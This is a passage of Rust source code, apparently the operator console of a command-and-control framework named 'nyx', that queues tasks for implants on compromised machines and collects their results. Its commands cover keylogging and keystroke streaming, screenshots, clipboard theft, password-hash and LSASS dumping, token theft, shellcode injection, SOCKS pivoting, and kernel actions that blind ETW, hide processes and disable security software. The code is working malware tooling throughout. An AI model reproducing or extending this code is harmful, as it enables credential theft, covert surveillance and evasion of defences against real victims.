                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match enqueue_socks(&client, srv, &session, chan, op, &addr, port, tok).await {
                        Ok(tid) => log_push(
                            &mut log_buf,
                            &format!(
                                "[{}] socks chan {chan} {addr}:{port} (task {})",
                                short(&session),
                                tid
                            ),
                            Level::Info,
                        ),
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! socks enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::SocksStart { session, bind_addr } => {
                    // Only one in-TUI relay at a time. The headless `nyx-cli
                    // socks` subcommand is a separate process and can't be
                    // detected here, but running two relays for the same session
                    // would race on `/api/results` — the worker wins (it's the
                    // drainer), so the headless bridge would stall. The operator
                    // must pick one.
                    if let Some(ref existing) = socks_relay {
                        log_push(
                            &mut log_buf,
                            &format!(
                                "! SOCKS relay already running (session {}, bind {}) — /socks stop first",
                                session_short(&existing.ctx.session),
                                existing.bind_addr
                            ),
                            Level::Err,
                        );
                        continue;
                    }
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    match start_socks_relay(&client, srv.clone(), tok.clone(), session, &bind_addr)
                    {
                        Ok(relay) => {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[socks] listening on {} (session {}, auth: none (loopback); \
                                     use a SOCKS5 client to connect)",
                                    relay.bind_addr,
                                    session_short(&relay.ctx.session)
                                ),
                                Level::Ok,
                            );
                            log_push(
                                &mut log_buf,
                                "[socks] note: relay latency = one beacon sleep cycle per direction; \
                                 set a low /sleep on the beacon for active use.",
                                Level::Info,
                            );
                            log_push(
                                &mut log_buf,
                                "[socks] note: implant is IPv4-only — domain/IPv6 targets will fail \
                                 at connect.",
                                Level::Info,
                            );
                            socks_relay = Some(relay);
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! [socks] start: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::SocksStop { session } => {
                    if let Some(relay) = socks_relay.take() {
                        // The relay is single-instance; if the operator's
                        // selected session differs from the one the relay is
                        // bound to, still stop it (there's only one) but note
                        // the mismatch.
                        if relay.ctx.session != session {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[socks] note: relay was for {}, not {} — stopping anyway",
                                    session_short(&relay.ctx.session),
                                    short(&session)
                                ),
                                Level::Warn,
                            );
                        }
                        relay.shutdown(&client).await;
                        relay.accept_task.abort();
                        log_push(
                            &mut log_buf,
                            &format!(
                                "[socks] stopped (session {})",
                                session_short(&relay.ctx.session)
                            ),
                            Level::Ok,
                        );
                    } else {
                        log_push(&mut log_buf, "[socks] not running", Level::Warn);
                    }
                }
                Cmd::Screenshot { session, monitor } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "screenshot", "monitor": monitor });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[{}] screenshot monitor {monitor} (task {})",
                                    short(&session),
                                    tid
                                ),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Screenshot,
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! screenshot: {e}"), Level::Err),
                    }
                }
                Cmd::Portscan {
                    session,
                    host,
                    ports,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd =
                        serde_json::json!({ "type": "portscan", "host": host, "ports": ports });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[{}] portscan {host} {ports} (task {})",
                                    short(&session),
                                    tid
                                ),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! portscan: {e}"), Level::Err),
                    }
                }
                Cmd::Net { session, query } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "net", "query": query });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] net {query} (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! net: {e}"), Level::Err),
                    }
                }
                Cmd::DriveInfo { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let command = serde_json::json!({ "type": "driveinfo" });
                    match enqueue_simple(&client, srv, &session, command, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] driveinfo (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! driveinfo: {e}"), Level::Err),
                    }
                }
                Cmd::Clipboard { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let command = serde_json::json!({ "type": "clipboard" });
                    match enqueue_simple(&client, srv, &session, command, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] clipboard (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! clipboard: {e}"), Level::Err),
                    }
                }
                Cmd::Env { session, name } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "env", "name": name });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] env {name} (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! env: {e}"), Level::Err),
                    }
                }
                Cmd::Keylog { session, action } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "keylog", "action": action });
                    let label = match action {
                        0 => "start",
                        1 => "stop",
                        _ => "dump",
                    };
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] keylog {label} (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! keylog: {e}"), Level::Err),
                    }
                }
                Cmd::KeylogStreamStart {
                    session,
                    interval_secs,
                } => {
                    // Clamp to a 2s floor — anything tighter would flood the
                    // server with dump tasks and exhaust the result queue.
                    let interval_secs = interval_secs.max(2);
                    keylog_streaming = Some((session.clone(), interval_secs));
                    log_push(
                        &mut log_buf,
                        &format!(
                            "[{}] keylog stream started ({}s)",
                            short(&session),
                            interval_secs
                        ),
                        Level::Info,
                    );
                }
                Cmd::KeylogStreamStop { session } => {
                    keylog_streaming = None;
                    // Drop any in-flight KeylogStream task so it doesn't fire one
                    // final dump after the operator asked to stop.
                    pending.retain(|t| !matches!(t.kind, TaskKind::KeylogStream { .. }));
                    log_push(
                        &mut log_buf,
                        &format!("[{}] keylog stream stopped", short(&session)),
                        Level::Info,
                    );
                }
                Cmd::Screenwatch {
                    session,
                    interval_secs,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "screenwatch", "interval_secs": interval_secs });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[{}] screenwatch {interval_secs}s (task {})",
                                    short(&session),
                                    tid
                                ),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Screenshot,
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! screenwatch: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::Hashdump { session, method } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "hashdump", "method": method });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] hashdump (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Hashdump { method },
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! hashdump: {e}"), Level::Err),
                    }
                }
                Cmd::StealToken { session, pid } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "stealtoken", "pid": pid });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] steal_token({pid}) (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! steal_token: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::MakeToken {
                    session,
                    domain,
                    user,
                    password,
                    logon_type,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "maketoken", "domain": domain, "user": user, "password": password, "logon_type": logon_type });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[{}] make_token({domain}\\{user}) (task {})",
                                    short(&session),
                                    tid
                                ),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! make_token: {e}"), Level::Err),
                    }
                }
                Cmd::Rev2Self { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "rev2self" });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] rev2self (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! rev2self: {e}"), Level::Err),
                    }
                }
                Cmd::GetUid { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "getuid" });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] getuid (task {})", short(&session), tid),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! getuid: {e}"), Level::Err),
                    }
                }
                Cmd::Inject {
                    session,
                    method,
                    pid,
                    spawn_to,
                    sc_hex,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({
                        "type": "inject",
                        "method": method,
                        "pid": pid,
                        "spawn_to": spawn_to,
                        "sc_hex": sc_hex,
                    });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!(
                                    "[{}] inject method={} pid={} (task {})",
                                    short(&session),
                                    method,
                                    pid,
                                    tid
                                ),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session,
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: TASK_BACKOFF_START,
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                chunks: Vec::new(),
                                saw_eof: false,
                            });
                        }
                        Err(e) => log_push(&mut log_buf, &format!("! inject: {e}"), Level::Err),
                    }
                }
                Cmd::FetchCreds { reveal } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let url = if reveal {
                        format!("{srv}/api/creds?reveal=1")
                    } else {
                        format!("{srv}/api/creds")
                    };
                    match authed(client.get(&url), tok).send().await {
                        Ok(resp) => match resp.json::<Vec<ServerCred>>().await {
                            Ok(rows) => {
                                let n = rows.len();
                                log_push(
                                    &mut log_buf,
                                    &format!("server creds: {n} record(s)"),
                                    Level::Ok,
                                );
                                // Adapt to the CredEntry overlay shape (principal = realm\user).
                                let entries: Vec<CredEntry> = rows
                                    .into_iter()
                                    .map(|c| {
                                        let principal = if c.realm.is_empty() {
                                            c.user.clone()
                                        } else {
                                            format!("{}\\{}", c.realm, c.user)
                                        };
                                        CredEntry {
                                            source: c.kind.clone(),
                                            principal,
                                            kind: match c.kind.as_str() {
                                                "password" => CredKind::Password,
                                                "ticket" => CredKind::Ticket,
                                                "key" => CredKind::Key,
                                                _ => CredKind::Hash,
                                            },
                                            secret: c.secret,
                                        }
                                    })
                                    .collect();
                                parsed_buf = Some(ParsedTable::Creds(entries));
                            }
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! creds parse: {e}"), Level::Err)
                            }
                        },
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! creds fetch: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::FetchAudit {
                    operator,
                    action,
                    limit,
                } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    // Build the query string from the optional filters.
                    let mut qs: Vec<String> = Vec::new();
                    if let Some(op) = &operator {
                        qs.push(format!("operator={}", encode(op)));
                    }
                    if let Some(ac) = &action {
                        qs.push(format!("action={}", encode(ac)));
                    }
                    if let Some(l) = limit {
                        qs.push(format!("limit={l}"));
                    }
                    let url = if qs.is_empty() {
                        format!("{srv}/api/audit")
                    } else {
                        format!("{srv}/api/audit?{}", qs.join("&"))
                    };
                    match authed(client.get(&url), tok).send().await {
                        Ok(resp) => match resp.json::<Vec<AuditRow>>().await {
                            Ok(rows) => {
                                let n = rows.len();
                                log_push(&mut log_buf, &format!("audit: {n} record(s)"), Level::Ok);
                                parsed_buf = Some(ParsedTable::Audit(rows));
                            }
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! audit parse: {e}"), Level::Err)
                            }
                        },
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! audit fetch: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::FetchTasks { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let url = format!("{srv}/api/tasks?session={}", encode(&session));
                    match authed(client.get(&url), tok).send().await {
                        Ok(resp) => match resp.json::<Vec<TaskRow>>().await {
                            Ok(rows) => {
                                let n = rows.len();
                                log_push(&mut log_buf, &format!("tasks: {n} queued",), Level::Ok);
                                // parsed_buf is mandatory — without it the
                                // overlay never opens (see the /profile bug).
                                parsed_buf = Some(ParsedTable::Tasks(rows));
                            }
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! tasks parse: {e}"), Level::Err)
                            }
                        },
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! tasks fetch: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::KernelStatus => {
                    let Some((ref srv, ref tok)) = server else {
                        continue;
                    };
                    match authed(client.get(format!("{srv}/api/kernel/status")), tok)
                        .send()
                        .await
                    {
                        Ok(r) => match r.json::<serde_json::Value>().await {
                            Ok(v) => log_push(&mut log_buf, &format!("kernel: {v}"), Level::Info),
                            Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}"), Level::Err),
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! kernel: {e}"), Level::Err),
                    }
                }
                Cmd::KernelBlindEtw => {
                    let Some((ref srv, ref tok)) = server else {
                        continue;
                    };
                    match authed(client.post(format!("{srv}/api/kernel/blind-etw")), tok)
                        .send()
                        .await
                    {
                        Ok(r) => match r.json::<serde_json::Value>().await {
                            Ok(v) => {
                                log_push(&mut log_buf, &format!("blind-etw: {v}"), Level::Info)
                            }
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err)
                            }
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! blind-etw: {e}"), Level::Err),
                    }
                }
                Cmd::KernelHide { pid } => {
                    let Some((ref srv, ref tok)) = server else {
                        continue;
                    };
                    match authed(client.post(format!("{srv}/api/kernel/hide?pid={pid}")), tok)
                        .send()
                        .await
                    {
                        Ok(r) => match r.json::<serde_json::Value>().await {
                            Ok(v) => {
                                log_push(&mut log_buf, &format!("hide {pid}: {v}"), Level::Info)
                            }
                            Err(e) => log_push(&mut log_buf, &format!("! hide: {e}"), Level::Err),
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! hide: {e}"), Level::Err),
                    }
                }
                Cmd::KernelDumpLsass { pid } => {
                    let Some((ref srv, ref tok)) = server else {
                        continue;
                    };
                    match authed(
                        client.post(format!("{srv}/api/kernel/dump-lsass?pid={pid}")),
                        tok,
                    )
                    .send()
                    .await
                    {
                        Ok(r) => match r.json::<serde_json::Value>().await {
                            Ok(v) => log_push(
                                &mut log_buf,
                                &format!("dump-lsass {pid}: {v}"),
                                Level::Info,
                            ),
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err)
                            }
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! dump-lsass: {e}"), Level::Err),
                    }
                }
                Cmd::KernelNeutralize { pid } => {
                    let Some((ref srv, ref tok)) = server else {
                        continue;
                    };
                    match authed(
                        client.post(format!("{srv}/api/kernel/neutralize?pid={pid}")),
                        tok,
                    )
                    .send()
                    .await
                    {
                        Ok(r) => match r.json::<serde_json::Value>().await {
                            Ok(v) => log_push(
                                &mut log_buf,
                                &format!("neutralize {pid}: {v}"),
                                Level::Info,
                            ),
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err)
                            }
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! neutralize: {e}"), Level::Err),
                    }
                }
                Cmd::Trex { session } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "trex" });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => {
                            log_push(
                                &mut log_buf,
                                &format!("[{}] T-REX → task {tid}", short(&session)),
                                Level::Info,
                            );
                            pending.push(PendingTask {
                                session: session.clone(),
                                task_id: tid,
                                kind: TaskKind::Shell(ParseAs::None),
                                backoff: Duration::from_secs(5),
                                last_poll: Instant::now(),
                                started_at: Instant::now(),
                                saw_eof: false,
                                chunks: Vec::new(),
                            });
                        }
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! trex enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::SetChannel { session, channel } => {
                    let Some((ref srv, ref tok)) = server else {
                        log_push(&mut log_buf, "! not connected", Level::Err);
                        continue;
                    };
                    let cmd = serde_json::json!({ "type": "setchannel", "channel": channel });
                    match enqueue_simple(&client, srv, &session, cmd, tok).await {
                        Ok(tid) => log_push(
                            &mut log_buf,
                            &format!("[{}] channel set → task {tid}", short(&session)),
                            Level::Info,
                        ),
                        Err(e) => {
                            log_push(&mut log_buf, &format!("! channel enqueue: {e}"), Level::Err)
                        }
                    }
                }
                Cmd::KernelDetachMinifilter => {
                    let Some((ref srv, ref tok)) = server else {
                        continue;
                    };
                    match authed(
                        client.post(format!("{srv}/api/kernel/detach-minifilter")),
                        tok,
                    )
                    .send()
                    .await
                    {
                        Ok(r) => match r.json::<serde_json::Value>().await {
                            Ok(v) => log_push(
                                &mut log_buf,
                                &format!("detach-minifilter: {v}"),
                                Level::Info,
                            ),
                            Err(e) => {
                                log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err)
                            }
                        },
                        Err(e) => log_push(&mut log_buf, &format!("! detach-mf: {e}"), Level::Err),
                    }
                }
            }
        }

        let Some((ref srv, ref token)) = server else {
            tokio::time::sleep(Duration::from_millis(200)).await;
            continue;
        };

        // 2. Refresh session list (throttled).
        match fetch_sessions(&client, srv, token).await {
            Ok(list) => {
                let sig = session_signature(&list);
                let changed = sig != last_session_sig || connect_changed;
                let connected_changed = !was_connected || connect_changed;
                was_connected = true;
                if changed {
                    last_session_sig = sig;
                }
                if changed || connected_changed || !log_buf.is_empty() || parsed_buf.is_some() {
                    let _ = snap_tx.send(Snapshot {
                        sessions: if changed { list.clone() } else { Vec::new() },
                        log_lines: std::mem::take(&mut log_buf),
                        connected: true,
                        parsed: parsed_buf.take(),
                    });
                }
            }
            Err(e) => {
                was_connected = false;
                log_push(&mut log_buf, &format!("! sessions: {e}"), Level::Err);
                let _ = snap_tx.send(Snapshot {
                    sessions: Vec::new(),
                    log_lines: std::mem::take(&mut log_buf),
                    connected: false,
                    parsed: None,
                });
            }
        }

        // 3. Poll pending tasks (with per-task backoff + overall deadline).
        //
        // The server's `GET /api/results` DRAINS the entire session's result
        // queue (`std::mem::take`) regardless of which task the caller cares
        // about. So if we fetched once per pending task, whichever task polled
        // first would empty the queue and silently destroy the others' results
        // (concurrent tasks A and B on the same session: A's poll eats B's row).
        //
        // Fix: drain each unique session exactly ONCE per pass, then demux the
        // rows locally by `task_id`. This kills N-1 redundant HTTP calls per
        // pass and stops the silent result loss between concurrent tasks.
        let mut still_pending = Vec::new();

        // Partition: tasks whose per-task backoff hasn't elapsed stay pending
        // without a fetch; the rest become candidates for this pass. Slots are
        // `Option<PendingTask>` so we can take ownership of a task out of its
        // slot (for routing) without needing `PendingTask: Default`.
        let mut due: Vec<Option<PendingTask>> = Vec::new();
        for t in pending.drain(..) {
            if t.last_poll.elapsed() < t.backoff {
                still_pending.push(t);
                continue;
            }
            // Chunked tasks (downloads + screenshots) stream FileChunks + eof.
            let is_chunked = matches!(t.kind, TaskKind::Download { .. } | TaskKind::Screenshot);
            // Long-lived tasks are exempt from TASK_DEADLINE: downloads/screenshots
            // stream chunks and set their own eof; KeylogStream dump tasks may sit
            // waiting on a slow-beacon result that takes longer than 60s to come
            // back (the worker re-enqueues a fresh one on completion, so without
            // the exemption a long beacon interval would starve the stream).
            let is_long_lived = is_chunked || matches!(t.kind, TaskKind::KeylogStream { .. });
            if !is_long_lived && t.started_at.elapsed() > TASK_DEADLINE {
                log_push(
                    &mut log_buf,
                    &format!(
                        "[{}] task {} timed out (>{:?}) — dropped",
                        short(&t.session),
                        t.task_id,
                        TASK_DEADLINE
                    ),
                    Level::Warn,
                );
                continue;
            }
            due.push(Some(t));
        }

        // Group due tasks by session so we can fetch each session once. The
        // Vec<usize> holds positions into `due` so we can take each task out of
        // its slot while iterating sessions.
        let mut by_session: HashMap<String, Vec<usize>> = HashMap::new();
        for (i, slot) in due.iter().enumerate() {
            by_session
                .entry(
                    slot.as_ref()
                        .expect("due slot set in prior loop")
                        .session
                        .clone(),
                )
                .or_default()
                .push(i);
        }

        for (session, indices) in by_session {
            // Single drain for the whole session — all tasks' rows at once.
            let fetched = fetch_results(&client, srv, &session, token).await;
            let rs = match fetched {
                Ok(rs) => rs,
                Err(e) => {
                    // A session-level fetch failure retries every task on it.
                    log_push(
                        &mut log_buf,
                        &format!("[{}] ! {}", short(&session), e),
                        Level::Err,
                    );
                    for i in indices {
                        if let Some(mut t) = due[i].take() {
                            t.backoff = (t.backoff * 2).min(TASK_BACKOFF_CAP);
                            t.last_poll = Instant::now();
                            still_pending.push(t);
                        }
                    }
                    continue;
                }
            };

            // Demux channel + connect-error rows. When the in-TUI SOCKS relay is
            // running for THIS session, route each `kind:"channel"` row (and any
            // `kind:"error"` row whose task_id is a relay connect) to its chan's
            // consumer via `socks::handle_row` — the same demux the headless
            // bridge uses. The worker is the sole `/api/results` drainer, so
            // feeding rows here preserves the P0-A single-drain invariant. When
            // no relay is running (or it's for a different session), surface the
            // channel row so the data isn't silently destroyed.
            //
            // `handle_row` is a no-op on `error` rows whose task_id isn't in the
            // relay's `task_to_chan` (i.e. regular tasks), so passing every error
            // row through it is safe — those rows are still routed to their
            // pending task by the loop below.
            let relay_active = socks_relay
                .as_ref()
                .map(|r| r.ctx.session == session)
                .unwrap_or(false);
            for r in &rs {
                if r.kind == "channel" {
                    if relay_active {
                        socks::handle_row(
                            socks_relay
                                .as_ref()
                                .expect("relay_active implies Some")
                                .ctx
                                .as_ref(),
                            r.clone(),
                        );
                    } else {
                        let chan = extract_chan_from_text(&r.text).unwrap_or(r.task_id);
                        log_push(
                            &mut log_buf,
                            &format!(
                                "[{}] [chan] channel row with no relay running (chan={}); use \
                                 `/socks start` to consume",
                                short(&session),
                                chan
                            ),
                            Level::Info,
                        );
                    }
                } else if r.kind == "error" && relay_active {
                    // Connect-task failures surface as kind:error keyed by the
                    // connect task_id — map back to the chan so the connection
                    // tears down instead of waiting for the 30s open timeout.
                    socks::handle_row(
                        socks_relay
                            .as_ref()
                            .expect("relay_active implies Some")
                            .ctx
                            .as_ref(),
                        r.clone(),
                    );
                }
            }

            // Route each due task against the shared buffer. Chunked tasks look
            // up their FileChunks by task_id from the same drain; everyone else
            // takes their single row via poll_result_from_buf. The exact same
            // route_result / finish_chunked / PollOutcome API is preserved.
            for i in indices {
                let Some(mut t) = due[i].take() else {
                    continue;
                };
                let is_chunked = matches!(t.kind, TaskKind::Download { .. } | TaskKind::Screenshot);
                let res = if is_chunked {
                    poll_file_chunks_from_buf(&rs, t.task_id, &mut t.chunks, &mut t.saw_eof)
                } else {
                    poll_result_from_buf(&rs, t.task_id)
                };
                match res {
                    PollOutcome::Done(out) => {
                        route_result(&mut log_buf, &mut parsed_buf, &t, out);
                        if is_chunked {
                            finish_chunked(&mut log_buf, &mut parsed_buf, &t);
                        }
                    }
                    PollOutcome::Pending => {
                        t.backoff = (t.backoff * 2).min(TASK_BACKOFF_CAP);
                        t.last_poll = Instant::now();
                        still_pending.push(t);
                    }
                    PollOutcome::Err(e) => {
                        log_push(
                            &mut log_buf,
                            &format!("[{}] ! {}", short(&t.session), e),
                            Level::Err,
                        );
                    }
                }
            }
        }
        pending = still_pending;

        // Auto-enqueue the next keylog dump if streaming is active and no dump
        // task for that session is currently pending. The prior dump (Done) has
        // just been dropped from `pending`, so this is where the continuous
        // stream actually loops — the new task sits in the queue until the
        // beacon polls next, and its result re-enters this block on the next
        // iteration. `backoff` is set to the interval so the first poll waits
        // the full interval rather than firing immediately.
        if let Some((ref kl_session, kl_interval)) = &keylog_streaming {
            let has_pending = pending.iter().any(|t| {
                t.session == *kl_session && matches!(t.kind, TaskKind::KeylogStream { .. })
            });
